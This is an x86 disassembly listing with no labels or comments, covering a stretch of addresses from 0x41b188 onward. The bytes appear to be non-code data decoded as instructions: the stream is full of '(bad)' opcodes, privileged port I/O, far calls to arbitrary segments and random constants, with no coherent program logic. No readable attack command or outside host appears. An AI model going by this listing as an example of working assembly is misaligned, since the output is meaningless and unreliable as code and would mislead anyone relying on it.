  41b188:	jecxz  0x41b1b7
  41b18a:	rcl    BYTE PTR [eax],0xc0
  41b18d:	inc    eax
  41b18e:	pop    esi
  41b18f:	in     eax,dx
  41b190:	fucomp st(5)
  41b192:	je     0x41b1c3
  41b194:	test   al,0xa0
  41b196:	mov    al,ds:0x48aacada
  41b19b:	fwait
  41b19c:	sub    al,0x3f
  41b19e:	ret    
  41b19f:	ja     0x41b1a7
  41b1a1:	cld    
  41b1a2:	jecxz  0x41b130
  41b1a4:	mov    esi,0x3d31c05e
  41b1a9:	cmp    BYTE PTR [esi+0x49],ch
  41b1ac:	sub    ch,dh
  41b1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1af:	inc    ebp
  41b1b0:	es jp  0x41b1f1
  41b1b3:	cmp    esi,DWORD PTR [eax+eax*1+0x0]
	...
  41b213:	add    BYTE PTR [eax],al
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	jno    0x41b256
  41b224:	xchg   esi,eax
  41b225:	into   
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [ebp+0x7629c41],ch
  41b233:	mov    ah,BYTE PTR [edi]
  41b235:	mov    al,ds:0xf147c694
  41b23a:	clc    
  41b23b:	adc    al,0x55
  41b23d:	push   edi
  41b23e:	mov    eax,ds:0x1a8f09e2
  41b243:	mov    ah,0x55
  41b245:	repnz mov BYTE PTR [eax+0x8],dl
  41b249:	sahf   
  41b24a:	sub    edx,DWORD PTR [ebp+ebx*2+0x107fea67]
  41b251:	mov    ebp,0xb91a5752
  41b256:	sub    ebx,ebx
  41b258:	xchg   ebx,eax
  41b259:	sbb    edi,edx
  41b25b:	scas   al,BYTE PTR es:[edi]
  41b25c:	pop    ecx
  41b25d:	pop    es
  41b25e:	adc    al,0x74
  41b260:	pusha  
  41b261:	jle    0x41b237
  41b263:	das    
  41b264:	inc    edi
  41b265:	inc    eax
  41b266:	cmp    al,0x41
  41b268:	mov    ebx,0x91cfef22
  41b26d:	lods   al,BYTE PTR ds:[esi]
  41b26e:	ficom  DWORD PTR [ecx+ebp*8+0x642b37f6]
  41b275:	adc    bl,BYTE PTR [edx]
  41b277:	(bad)  
  41b278:	ror    BYTE PTR [ecx+0x1b78c557],cl
  41b27e:	(bad)  
  41b27f:	(bad)  
  41b281:	sub    eax,0x8c60b510
  41b286:	loop   0x41b252
  41b288:	jle    0x41b21f
  41b28a:	mov    edx,0x83cce341
  41b28f:	sahf   
  41b290:	sar    BYTE PTR [ebx+0x3442d738],1
  41b296:	mov    esp,0xf0e84d8d
  41b29b:	inc    eax
  41b29c:	jp     0x41b2b3
  41b29e:	loop   0x41b297
  41b2a0:	test   al,0x1
  41b2a2:	mov    edx,0x1187756e
  41b2a7:	or     al,0x5d
  41b2a9:	(bad)  
  41b2ab:	or     edi,esi
  41b2ad:	jp     0x41b267
  41b2af:	inc    esi
  41b2b0:	dec    ebp
  41b2b1:	adc    eax,0xaddf9884
  41b2b6:	xchg   edi,eax
  41b2b7:	add    eax,0x688a268d
  41b2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2bd:	mov    edx,0x726f3b11
  41b2c2:	pop    edi
  41b2c3:	(bad)  
  41b2c4:	fisubr DWORD PTR [edx+ebp*4]
  41b2c7:	jp     0x41b2f6
  41b2c9:	mov    edi,ds
  41b2cb:	mov    WORD PTR [edi+0x0],ds
  41b2ce:	popa   
  41b2cf:	mov    ebp,0x8d7b8bfe
  41b2d4:	das    
  41b2d5:	dec    edx
  41b2d6:	mov    bh,0x80
  41b2d8:	push   esp
  41b2d9:	mov    edx,0xb7b17208
  41b2de:	call   0xbc732ab1
  41b2e3:	mov    ch,0x40
  41b2e5:	jge    0x41b300
  41b2e7:	mov    al,ds:0x1043e387
  41b2ec:	jp     0x41b2e4
  41b2ee:	(bad)  
  41b2ef:	lea    ebp,[ebx+0x1e]
  41b2f2:	scas   eax,DWORD PTR es:[edi]
  41b2f3:	or     ebp,ebp
  41b2f5:	clc    
  41b2f6:	data16 and al,0xe3
  41b2f9:	stos   BYTE PTR es:[edi],al
  41b2fa:	shl    DWORD PTR [ebp-0x64],cl
  41b2fd:	in     al,dx
  41b2fe:	test   BYTE PTR [esi+0x72],ah
  41b301:	mov    dl,0x8d
  41b303:	outs   dx,BYTE PTR ds:[esi]
  41b304:	jns    0x41b373
  41b306:	pop    ebp
  41b307:	data16 in al,0x44
  41b30a:	mov    cl,0xdc
  41b30c:	pcmpeqw mm7,QWORD PTR [ebp-0x3919eab4]
  41b313:	mov    al,0x85
  41b315:	scas   al,BYTE PTR es:[edi]
  41b316:	icebp  
  41b317:	mov    dl,0xd1
  41b319:	les    ebx,FWORD PTR [esi-0x7a338bd4]
  41b31f:	ja     0x41b344
  41b321:	add    BYTE PTR [eax],ch
  41b323:	scas   al,BYTE PTR es:[edi]
  41b324:	jbe    0x41b2fe
  41b326:	fisubr WORD PTR [ebp+0x2ac8db70]
  41b32c:	fdiv   DWORD PTR [edx+0xcbb9861]
  41b332:	xchg   edx,eax
  41b333:	jl     0x41b31c
	...
  41b395:	add    BYTE PTR [eax+0xd],cl
  41b398:	sbb    eax,0xfebb5dab
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	add    dl,0x77
  41b3a5:	retf   0x1f0f
  41b3a8:	add    DWORD PTR [eax],eax
  41b3aa:	pop    es
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    dh,dl
  41b3af:	es shl ebp,1
  41b3b2:	loopne 0x41b394
  41b3b4:	cmp    BYTE PTR [eax+0x7b],ch
  41b3b7:	aad    0x7f
  41b3b9:	xor    al,0x7c
  41b3bb:	xor    BYTE PTR [eax-0x53],0xd4
  41b3bf:	sbb    al,0xa7
  41b3c1:	or     BYTE PTR [ebx-0x2e4f0236],dl
  41b3c7:	shl    DWORD PTR [esi],0x87
  41b3ca:	in     eax,0xab
  41b3cc:	iret   
  41b3cd:	mov    ch,0xa9
  41b3cf:	sbb    bh,cl
  41b3d1:	fstp   QWORD PTR [eax+0x25]
  41b3d4:	cmc    
  41b3d5:	in     eax,dx
  41b3d6:	push   0xdb574aec
  41b3db:	sbb    al,0x43
  41b3dd:	and    esp,DWORD PTR [esi-0x17f04722]
  41b3e3:	shl    DWORD PTR [ebp-0x5297a9b0],0x74
  41b3ea:	iret   
  41b3eb:	jmp    0xa393487
  41b3f0:	fimul  DWORD PTR [esi-0x6a]
  41b3f3:	pop    DWORD PTR [ebp+0x1acb18e7]
  41b3f9:	fimul  DWORD PTR [ecx+0x4df9c715]
  41b3ff:	jl     0x41b381
  41b401:	bound  ecx,QWORD PTR [ebx+0x2c8afa5b]
  41b407:	push   ecx
  41b408:	loop   0x41b412
  41b40a:	in     eax,dx
  41b40b:	xor    DWORD PTR [esi-0x4f],eax
  41b40e:	sbb    BYTE PTR [ecx+0x66],dh
  41b411:	inc    ecx
  41b412:	cmp    BYTE PTR [eax+0x25],ah
  41b415:	xchg   BYTE PTR [esi-0x30aa3f6d],bh
  41b41b:	(bad)  ds:0x18648c86
  41b421:	imul   eax,DWORD PTR [edi-0x4f0d9a32],0x52950253
  41b42b:	adc    BYTE PTR [ebp+0x33288ebd],dl
  41b431:	and    al,0x4c
  41b433:	out    dx,al
  41b434:	call   0x607e:0xc87f186d
  41b43b:	cmc    
  41b43c:	or     al,0x16
  41b43e:	or     DWORD PTR [eax-0x4904e03a],eax
  41b444:	mov    edi,0x8cbf8eca
  41b449:	mov    DWORD PTR [ebp+0x7abfca74],esi
  41b44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b450:	mov    bl,0xab
  41b452:	std    
  41b453:	gs xor eax,0x9a11cd2f
  41b459:	inc    esp
  41b45a:	fwait
  41b45b:	or     al,0x99
  41b45d:	or     ebp,DWORD PTR [edi+0x1c3b1a23]
  41b463:	mov    ds:0x17c5270d,al
  41b468:	lods   eax,DWORD PTR ss:[esi]
  41b46a:	(bad)  
  41b46b:	and    al,0x5
  41b46d:	pop    edi
  41b46e:	push   ss
  41b46f:	pop    ss
  41b470:	sahf   
  41b471:	gs adc eax,0x80f4807f
  41b477:	int3   
  41b478:	sar    BYTE PTR [edx-0x37ec8230],cl
  41b47e:	test   eax,0xf9b776a3
  41b483:	shl    BYTE PTR [esi],cl
  41b485:	(bad)  
  41b486:	xlat   BYTE PTR ds:[ebx]
  41b487:	out    0x21,al
  41b489:	lock or BYTE PTR [edx-0x15],bl
  41b48d:	jae    0x41b506
  41b48f:	mov    esi,DWORD PTR cs:[edi+esi*4+0x72]
  41b494:	mov    ah,0xef
  41b496:	and    BYTE PTR [edx-0x43],0xb
  41b49a:	call   0xe960:0x159c49bd
  41b4a1:	retf   0xc602
  41b4a4:	or     DWORD PTR [edx-0x78],ecx
  41b4a7:	int    0x26
  41b4a9:	push   ecx
  41b4aa:	mov    cl,0x54
  41b4ac:	int3   
  41b4ad:	mov    bh,0x72
  41b4af:	sub    al,0xb3
  41b4b1:	and    al,0x95
  41b4b3:	fdivrp st(5),st
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	push   eax
  41b523:	mov    ebx,0x2016f157
  41b528:	add    DWORD PTR [eax],eax
  41b52a:	pop    es
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [edx+0x2442f997],bl
  41b533:	mov    BYTE PTR [edx-0x75],ah
  41b536:	aam    0x7e
  41b538:	mov    ds:0x472116a1,eax
  41b53d:	xchg   ecx,eax
  41b53e:	cli    
  41b53f:	add    BYTE PTR [ecx-0x2e2e7e45],dh
  41b545:	neg    dh
  41b547:	pusha  
  41b548:	sbb    cl,BYTE PTR [eax+0x2f]
  41b54b:	sub    dh,BYTE PTR [ebx-0x29c8cef3]
  41b551:	dec    ebx
  41b552:	push   cs
  41b553:	(bad)  [edi+eax*4]
  41b556:	cmp    BYTE PTR [ecx+0x1cdbecff],0x70
  41b55d:	push   eax
  41b55e:	jne    0x9e694fb5
  41b564:	push   edi
  41b565:	cmp    BYTE PTR ds:0x82d7cf3b,0x91
  41b56c:	mov    BYTE PTR [eax+0x2d],ah
  41b56f:	das    
  41b570:	and    ch,BYTE PTR [edx]
  41b572:	mov    ch,0xeb
  41b574:	retf   
  41b575:	popa   
  41b576:	jb     0x41b597
  41b578:	outs   dx,BYTE PTR ds:[esi]
  41b579:	mov    gs,WORD PTR [edx+esi*8-0x308b42ee]
  41b580:	mov    esi,0x93b1ea5d
  41b585:	es inc esp
  41b587:	sub    edx,DWORD PTR [esi]
  41b589:	add    eax,0xe463f9bc
  41b58e:	inc    ch
  41b590:	push   es
  41b591:	xchg   edi,eax
  41b592:	fcom   QWORD PTR [eax-0x5c63d44f]
  41b598:	sub    BYTE PTR [ebp-0x3e4fd884],bl
  41b59e:	mov    DWORD PTR [ecx+esi*1],ebx
  41b5a1:	sub    eax,0x3cba5375
  41b5a6:	nop
  41b5a7:	pop    ecx
  41b5a8:	mov    ecx,0x11d2d8fe
  41b5ad:	sbb    al,0x3b
  41b5af:	stos   BYTE PTR es:[edi],al
  41b5b0:	jp     0x41b631
  41b5b2:	sbb    bl,BYTE PTR [ebp+0x1ab5ca9f]
  41b5b8:	adc    DWORD PTR [ebx+ebp*8],ebx
  41b5bb:	fistp  DWORD PTR [esp+edi*1+0x5701aacb]
  41b5c2:	add    DWORD PTR [edi],edi
  41b5c4:	bound  ecx,QWORD PTR [ebx-0x2af36416]
  41b5ca:	mov    ebp,0x95631fb1
  41b5cf:	mov    ss,WORD PTR [esi]
  41b5d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5d2:	mov    ebp,0x32e418e9
  41b5d7:	dec    ebx
  41b5d8:	or     eax,DWORD PTR [edx]
  41b5da:	mov    ecx,0x4d9e2abc
  41b5df:	(bad)  
  41b5e0:	mov    bl,0x38
  41b5e2:	test   eax,0xd5afbb2
  41b5e7:	test   dl,bl
  41b5e9:	aaa    
  41b5ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5eb:	repnz cmp eax,0x41dc020a
  41b5f1:	dec    edi
  41b5f2:	test   eax,0xe2847ae1
  41b5f7:	and    BYTE PTR [edx],dl
  41b5f9:	cli    
  41b5fa:	xor    ecx,DWORD PTR ds:0xd995b75
  41b600:	(bad)  
  41b601:	mov    bl,0x5e
  41b603:	jno    0x41b5b6
  41b605:	scas   al,BYTE PTR es:[edi]
  41b606:	or     BYTE PTR [eax],dl
  41b608:	stos   DWORD PTR es:[edi],eax
  41b609:	scas   eax,DWORD PTR es:[edi]
  41b60a:	sbb    BYTE PTR [esp+esi*4],ah
  41b60d:	retf   0x77b2
  41b610:	test   eax,0xc4dfd68d
  41b615:	or     dh,dl
  41b617:	dec    esi
  41b618:	vpshufd xmm7,xmm5,0x4e
  41b61d:	jl     0x41b5bd
  41b61f:	mov    esp,0x5805e45d
  41b624:	jp     0x41b695
  41b626:	lods   eax,DWORD PTR ds:[esi]
  41b627:	pop    ds
  41b628:	jmp    0x29bd:0x6d818254
  41b62f:	popf   
  41b630:	fisttp QWORD PTR [edi]
  41b632:	test   eax,0x3c02
	...
  41b693:	add    BYTE PTR [eax],al
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    ah,dl
  41b6a3:	and    BYTE PTR [eax+0x1211daa],al
  41b6a9:	add    BYTE PTR [edi],al
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [ecx],dh
  41b6af:	pop    ebx
  41b6b0:	imul   edx,DWORD PTR [ecx-0x29],0x65
  41b6b4:	clc    
  41b6b5:	call   0x3946:0x1c413236
  41b6bc:	jmp    0x41b6f0
  41b6be:	xchg   ebx,eax
  41b6bf:	xchg   edi,eax
  41b6c0:	push   0xfffffff2
  41b6c2:	aam    0x14
  41b6c4:	mov    edi,edx
  41b6c6:	push   eax
  41b6c7:	outs   dx,BYTE PTR ds:[esi]
  41b6c8:	int3   
  41b6c9:	popa   
  41b6ca:	nop
  41b6cb:	mov    al,BYTE PTR [esi+0x291f7f2a]
  41b6d1:	call   0x7980525c
  41b6d6:	jmp    0x41b674
  41b6d8:	fcom   QWORD PTR [ebx-0x18]
  41b6db:	sbb    eax,0x5456cef1
  41b6e0:	popf   
  41b6e1:	int3   
  41b6e2:	dec    eax
  41b6e3:	cs pop ecx
  41b6e5:	or     DWORD PTR [esi],esp
  41b6e7:	retf   
  41b6e8:	mov    eax,ds:0x23468c22
  41b6ed:	mov    edx,0x2572e8ce
  41b6f2:	inc    esi
  41b6f3:	fs mov ecx,0xd04d1ddf
  41b6f9:	cmp    bl,BYTE PTR [esi-0x49]
  41b6fc:	bound  ecx,QWORD PTR [ebx-0x12]
  41b6ff:	pushf  
  41b700:	or     eax,0x479d8808
  41b705:	xchg   ebx,eax
  41b706:	xchg   esp,eax
  41b707:	sahf   
  41b708:	pop    eax
  41b709:	add    al,0x99
  41b70b:	rol    BYTE PTR [ecx+0x41fdf64b],0x3c
  41b712:	bound  ebp,QWORD PTR [edi]
  41b714:	aad    0x6c
  41b716:	adc    DWORD PTR [eax+0x3984d520],ebx
  41b71c:	adc    DWORD PTR [edx-0x3b],ecx
  41b71f:	xchg   DWORD PTR [esp+edi*2],ebx
  41b722:	pop    eax
  41b723:	cmp    ah,bl
  41b725:	jge    0x41b739
  41b727:	fdivp  st(5),st
  41b729:	mov    al,ds:0x30c8c920
  41b72e:	and    BYTE PTR [ebx+esi*2-0x40cb0de6],bl
  41b735:	popf   
  41b736:	and    eax,0xad49608c
  41b73b:	ret    0x6c30
  41b73e:	mov    eax,0xd96cf59d
  41b743:	imul   ebp,DWORD PTR [esp+edi*2-0x2eea7c6c],0x3bad8ea4
  41b74e:	mov    cl,0xbf
  41b750:	mov    cl,0x9f
  41b752:	xchg   esi,eax
  41b753:	mov    esi,0xc88d50da
  41b758:	outs   dx,BYTE PTR ds:[esi]
  41b759:	sub    edi,DWORD PTR [eax]
  41b75b:	push   eax
  41b75c:	sub    eax,DWORD PTR [edx+0x6b]
  41b75f:	sbb    eax,0x66d92d39
  41b764:	int    0xb6
  41b766:	cmp    eax,0xfec709ef
  41b76b:	push   0x3f
  41b76d:	sbb    bl,ch
  41b76f:	cmp    bl,BYTE PTR [eax+0x33c2029a]
  41b775:	js     0x41b74d
  41b777:	(bad)  
  41b778:	cld    
  41b779:	add    al,0xe4
  41b77b:	(bad)  
  41b77c:	test   eax,0xaa1255a7
  41b781:	xchg   ebp,eax
  41b782:	inc    edx
  41b783:	jno    0x41b7e5
  41b785:	fild   DWORD PTR [esi-0x18]
  41b788:	jle    0x41b7eb
  41b78a:	dec    ebx
  41b78b:	iret   
  41b78c:	mov    ?,WORD PTR [eax]
  41b78e:	push   esi
  41b78f:	add    BYTE PTR [edx-0x64],cl
  41b792:	stc    
  41b793:	jl     0x41b775
  41b795:	sub    eax,0xe1d781f6
  41b79a:	and    al,0xe5
  41b79c:	xchg   ebx,eax
  41b79d:	pop    edi
  41b79e:	fsubr  DWORD PTR [ecx-0x3cb9fd25]
  41b7a4:	and    DWORD PTR [edx+eax*8+0x71707693],ebx
  41b7ab:	add    bh,BYTE PTR [esi-0x5a]
  41b7ae:	cmp    eax,0x15544912
  41b7b3:	ficom  DWORD PTR [edx+0x0]
	...
  41b816:	mov    bh,ah
  41b818:	(bad)  
  41b819:	dec    esi
  41b81a:	idiv   DWORD PTR [edi-0x75]
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x3a,al
  41b823:	shr    dh,cl
  41b825:	aam    0x24
  41b827:	and    al,BYTE PTR [ecx]
  41b829:	add    BYTE PTR [edi],al
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [edx],ch
  41b82f:	bound  esp,QWORD PTR [eax+ebp*8-0x31]
  41b833:	out    dx,al
  41b834:	inc    ecx
  41b835:	test   DWORD PTR [ecx+0x60],ebx
  41b838:	ja     0x41b8a2
  41b83a:	push   ds
  41b83b:	cmp    BYTE PTR [ecx+0x15],dl
  41b83e:	mov    ds:0x7e7b2517,al
  41b843:	cld    
  41b844:	jle    0x41b7ee
  41b846:	mov    ch,cl
  41b848:	popf   
  41b849:	icebp  
  41b84a:	in     al,0x0
  41b84c:	mov    esp,0xd73d7345
  41b851:	inc    esp
  41b852:	in     eax,dx
  41b853:	jno    0x41b82f
  41b855:	and    eax,0x4514d24
  41b85a:	pop    esi
  41b85b:	and    eax,0x53c1e5f5
  41b860:	mov    al,0xec
  41b862:	or     DWORD PTR [eax],0x59f2f736
  41b868:	(bad)  
  41b869:	retf   0x4de6
  41b86c:	jne    0x41b84e
  41b86e:	mov    eax,ds:0xc32d367f
  41b873:	test   al,0xfb
  41b875:	retf   
  41b876:	sub    al,0x3
  41b878:	add    BYTE PTR [esi-0x16b1a3d1],ch
  41b87e:	lds    eax,FWORD PTR [ebx+edx*4-0x6dd49a73]
  41b885:	mov    ah,0xbf
  41b887:	test   BYTE PTR [edx],ah
  41b889:	(bad)  
  41b88a:	adc    DWORD PTR [ebp+0x56],eax
  41b88d:	mov    esi,0xee683b18
  41b892:	icebp  
  41b893:	jmp    0x41b833
  41b895:	icebp  
  41b896:	xor    edi,esp
  41b898:	pop    ecx
  41b899:	jb     0x41b874
  41b89b:	retf   0x2681
  41b89e:	add    edi,esp
  41b8a0:	bound  ecx,QWORD PTR [bx+di]
  41b8a3:	popf   
  41b8a4:	inc    ecx
  41b8a5:	in     eax,0xa1
  41b8a7:	mov    BYTE PTR [edi],0x51
  41b8aa:	xor    al,0x4e
  41b8ac:	adc    eax,0x4d90c16e
  41b8b1:	xor    BYTE PTR [eax-0x55],bh
  41b8b4:	fld    QWORD PTR [esp+edx*8-0x7d]
  41b8b8:	das    
  41b8b9:	add    al,0x78
  41b8bb:	pop    ebx
  41b8bc:	call   0xb05d:0x1882fef9
  41b8c3:	es push ebp
  41b8c5:	in     al,dx
  41b8c6:	lods   al,BYTE PTR ds:[esi]
  41b8c7:	in     eax,dx
  41b8c8:	rcr    ebx,1
  41b8ca:	or     BYTE PTR [esp+ecx*1],ch
  41b8cd:	add    dh,0x8b
  41b8d0:	sub    cl,BYTE PTR [eax]
  41b8d2:	call   0x14af:0xf8a5831
  41b8d9:	mov    ds:0xf2010061,eax
  41b8de:	test   al,0x94
  41b8e0:	(bad)  
  41b8e1:	pop    edx
  41b8e2:	jo     0x41b8a3
  41b8e4:	or     cl,BYTE PTR ds:0x2118a204
  41b8ea:	and    DWORD PTR [esi],edi
  41b8ec:	sub    al,0x18
  41b8ee:	jl     0x41b8c8
  41b8f0:	mov    ebx,0x2827d114
  41b8f5:	retf   0x5372
  41b8f8:	pop    ds
  41b8f9:	xchg   ch,cl
  41b8fb:	nop
  41b8fc:	into   
  41b8fd:	xor    eax,DWORD PTR ds:0x9bc7dec0
  41b903:	pop    edi
  41b904:	sub    DWORD PTR [esi],esp
  41b906:	loopne 0x41b979
  41b908:	push   ss
  41b909:	aam    0xc7
  41b90b:	mov    BYTE PTR [edi+0x59f175eb],bh
  41b911:	xchg   bh,ch
  41b913:	pop    ebx
  41b914:	sub    eax,0x59041487
  41b919:	rcl    BYTE PTR [esi],cl
  41b91b:	pop    DWORD PTR [ecx]
  41b91d:	pop    ecx
  41b91e:	jae    0x41b99d
  41b920:	lahf   
  41b921:	mov    edi,0x4b04a2bd
  41b926:	or     eax,0x4f01cad3
  41b92b:	pop    esp
  41b92c:	mov    bl,0xeb
  41b92e:	jle    0x41b8e9
  41b930:	cwde   
  41b931:	ret    
  41b932:	jmp    0x42b388
	...
  41b993:	add    BYTE PTR [eax],al
  41b995:	add    bl,al
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	adc    dh,al
  41b9a4:	mov    ds:0x1232b1e,eax
  41b9a9:	add    BYTE PTR [edi],al
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    BYTE PTR [ecx],cl
  41b9af:	xor    esp,DWORD PTR [ecx]
  41b9b1:	call   0xb680:0x42d431f4
  41b9b8:	hlt    
  41b9b9:	add    al,0x63
  41b9bb:	mov    cl,0x2c
  41b9bd:	das    
  41b9be:	jmp    0x41ba00
  41b9c0:	std    
  41b9c1:	fcom   DWORD PTR [edx+0x1d]
  41b9c4:	(bad)  
  41b9c5:	mov    esp,cr5
  41b9c8:	dec    ecx
  41b9c9:	iret   
  41b9ca:	xor    al,0x27
  41b9cc:	mov    ah,0xbe
  41b9ce:	pop    ebp
  41b9cf:	outs   dx,BYTE PTR ds:[esi]
  41b9d0:	out    0x53,eax
  41b9d2:	imul   edi,DWORD PTR [edx-0x6b],0x71ceaaca
  41b9d9:	jnp    0x41ba0f
  41b9db:	sar    BYTE PTR [ebp+0x6a8b701c],0x67
  41b9e2:	aaa    
  41b9e3:	push   esi
  41b9e4:	mov    ds:0x33351509,al
  41b9e9:	xor    al,0x44
  41b9eb:	in     eax,0xc8
  41b9ed:	mov    bh,0xcd
  41b9ef:	or     eax,0x1df10efe
  41b9f4:	hlt    
  41b9f5:	inc    esi
  41b9f6:	loopne 0x41b9ba
  41b9f8:	lahf   
  41b9f9:	call   0x8ef96008
  41b9fe:	jle    0x41ba7a
  41ba00:	(bad)  
  41ba01:	pop    ebp
  41ba02:	inc    edi
  41ba03:	and    DWORD PTR [edx+0x3f],ebx
  41ba06:	lods   al,BYTE PTR ds:[esi]
  41ba07:	push   ecx
  41ba08:	adc    al,0xb5
  41ba0a:	add    cl,BYTE PTR [edi+0x5d]
  41ba0d:	adc    BYTE PTR [ebx+edi*2-0xa],bl
  41ba11:	xchg   esp,eax
  41ba12:	ret    
  41ba13:	add    BYTE PTR [ebx],dh
  41ba15:	ret    0x8f21
  41ba18:	dec    esi
  41ba19:	in     eax,0x7a
  41ba1b:	pminsw mm3,QWORD PTR [edx-0xa]
  41ba1f:	mov    eax,0x6c101697
  41ba24:	xlat   BYTE PTR ds:[ebx]
  41ba25:	lock fwait
  41ba27:	mov    cl,0x66
  41ba29:	stc    
  41ba2a:	inc    esi
  41ba2b:	int3   
  41ba2c:	inc    esi
  41ba2d:	jp     0x41b9de
  41ba2f:	call   FWORD PTR [edi-0x1413adf0]
  41ba35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba36:	imul   eax,DWORD PTR [edx+0x2fba8789],0x3f
  41ba3d:	ins    BYTE PTR es:[edi],dx
  41ba3e:	mov    ebp,0xaceaf32d
  41ba43:	xor    esp,ebp
  41ba45:	mov    esi,0x3b342fc8
  41ba4a:	test   bh,bh
  41ba4c:	mov    ds:0x4bc17ef7,eax
  41ba51:	les    edi,FWORD PTR [ecx]
  41ba53:	push   esi
  41ba54:	rcr    DWORD PTR [ebx],0xb
  41ba57:	cmp    BYTE PTR [esi+0x135e9ec8],dl
  41ba5d:	jo     0x41ba22
  41ba5f:	je     0x41ba45
  41ba61:	inc    ebp
  41ba62:	mov    dh,0x18
  41ba64:	scas   eax,DWORD PTR es:[edi]
  41ba65:	(bad)  
  41ba66:	stos   DWORD PTR es:[edi],eax
  41ba67:	cmp    dl,BYTE PTR [ebp+0xc]
  41ba6a:	or     al,0x2a
  41ba6c:	and    al,0xe2
  41ba6e:	stos   DWORD PTR es:[edi],eax
  41ba6f:	jge    0x41ba58
  41ba71:	imul   edi,DWORD PTR [eax],0xfffffff0
  41ba74:	mov    edi,0xf7c988e4
  41ba79:	push   ebx
  41ba7a:	push   ebx
  41ba7b:	cdq    
  41ba7c:	mov    ebp,0xe84c4d5c
  41ba81:	dec    ebx
  41ba82:	mov    bl,0xc8
  41ba84:	stos   DWORD PTR es:[edi],eax
  41ba85:	mov    ds:0xd44a5ef1,eax
  41ba8a:	test   eax,0xadd5d54a
  41ba90:	mov    ecx,0xbf3187f3
  41ba95:	mov    ds:0x333f8e07,al
  41ba9a:	stos   DWORD PTR es:[edi],eax
  41ba9b:	lock (bad) 
  41ba9d:	nop
  41ba9e:	mov    dh,0x66
  41baa0:	pushf  
  41baa1:	and    dh,BYTE PTR [edi]
  41baa3:	add    esp,DWORD PTR [edx]
  41baa5:	std    
  41baa6:	pop    edx
  41baa7:	mov    BYTE PTR [edi+ebp*2-0x6211eb34],ch
  41baae:	out    0xe8,eax
  41bab0:	ucomiss xmm7,xmm3
  41bab3:	or     bh,bh
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	add    BYTE PTR es:0x124324f,0x0
  41bb2a:	pop    es
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    bl,bh
  41bb2f:	pop    ds
  41bb30:	mov    al,0x98
  41bb32:	pop    ss
  41bb33:	mov    eax,0x42b8bd8e
  41bb38:	test   al,0x64
  41bb3a:	retf   0x4f76
  41bb3d:	push   DWORD PTR [edi-0xda8b404]
  41bb43:	test   ebp,eax
  41bb45:	mov    eax,0x31155517
  41bb4a:	pop    edi
  41bb4b:	aaa    
  41bb4c:	push   0x1
  41bb4e:	jecxz  0x41bad3
  41bb50:	jnp    0x41baf2
  41bb52:	jle    0x41bb4f
  41bb54:	nop
  41bb55:	lods   eax,DWORD PTR ds:[esi]
  41bb56:	dec    eax
  41bb57:	inc    ebx
  41bb58:	push   esi
  41bb59:	add    ecx,0x39
  41bb5c:	dec    ebx
  41bb5d:	ja     0x41bb73
  41bb5f:	mov    al,0x7f
  41bb61:	or     al,0x5c
  41bb63:	loopne 0x41bb0d
  41bb65:	das    
  41bb66:	shr    eax,cl
  41bb68:	jo     0x41bb90
  41bb6a:	loop   0x41bbce
  41bb6c:	and    ebp,edx
  41bb6e:	int    0x1b
  41bb70:	lods   al,BYTE PTR ds:[esi]
  41bb71:	div    DWORD PTR [edx]
  41bb73:	push   0xf5e6bec1
  41bb78:	leave  
  41bb79:	ror    DWORD PTR [edx-0x6dbeddd3],0xad
  41bb80:	or     dh,BYTE PTR [edx]
  41bb82:	fnstenv [ecx+0x19368fb3]
  41bb88:	and    DWORD PTR [ebp+0x68],esp
  41bb8b:	in     eax,0xa1
  41bb8d:	out    0x9a,eax
  41bb8f:	adc    BYTE PTR [ebp+0x64c81df],0xa0
  41bb96:	aas    
  41bb97:	pop    ss
  41bb98:	adc    eax,0x679c7218
  41bb9d:	push   ds
  41bb9e:	loopne 0x41bbc1
  41bba0:	mov    esp,0x40b375db
  41bba5:	aam    0xe9
  41bba7:	nop
  41bba8:	enter  0x8bd0,0x3
  41bbac:	repnz les ebx,FWORD PTR [ecx-0x630a6c5f]
  41bbb3:	out    dx,eax
  41bbb4:	int3   
  41bbb5:	jo     0x41bb51
  41bbb7:	jb     0x41bc04
  41bbb9:	mov    esp,DWORD PTR [ecx-0x2c]
  41bbbc:	fist   WORD PTR [ebx+0x43]
  41bbbf:	mov    al,0xe9
  41bbc1:	push   ss
  41bbc2:	mov    eax,0x86240c8f
  41bbc7:	stos   BYTE PTR es:[edi],al
